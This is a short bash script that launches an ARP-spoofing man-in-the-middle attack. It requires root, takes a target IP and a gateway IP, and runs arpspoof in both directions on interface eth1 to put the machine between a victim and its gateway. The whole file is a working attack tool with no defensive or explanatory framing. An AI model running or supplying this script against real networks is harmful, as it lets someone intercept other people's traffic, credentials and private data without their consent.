#!/bin/bash


if [ "$EUID" -ne 0 ]; then

	echo "[Error] Run as root"
	exit 1
fi

if [ -z "$1" ] || [ -z "$2" ]; then

	echo "[Error] Usage: $0 <target_ip> <gateway_ip>"
       exit 1	
fi

Target=$1
Gateway=$2
Interface=eth1



echo "[Info] Starting MITM attack"
echo "[Info] Target: $Target"
echo "[Info] Gateway: $Gateway"

echo "[Info] Launching ARP spoofing..."



arpspoof -i $Interface -t $Target $Gateway &

arpspoof -i $Interface -t $Gateway $Target &

echo "[Ok] MITM attack started"


